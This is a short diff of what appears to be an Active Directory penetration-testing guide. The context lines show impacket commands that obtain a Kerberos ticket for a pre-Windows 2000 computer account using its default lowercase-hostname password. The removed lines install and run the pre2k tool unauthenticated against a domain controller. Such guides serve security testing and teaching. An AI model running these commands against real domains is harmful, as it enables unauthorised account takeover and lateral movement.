@@ -128,10 +128,6 @@ sudo ntpdate dc-ip
 impacket-getTGT 'corp.local/COMPUTERNAME$:lowercasehostname' -dc-ip dc-ip
 export KRB5CCNAME=COMPUTERNAME\$.ccache
 klist  # verify ticket
-
-# Automated tool: pre2k by garrettfoster13
-pipx install git+https://github.com/garrettfoster13/pre2k
-pre2k unauth -d corp.local -dc-ip dc-ip -inputfile computers.txt -save
 ```
 
 Once you have a privileged computer account TGT, enumerate what it can access:
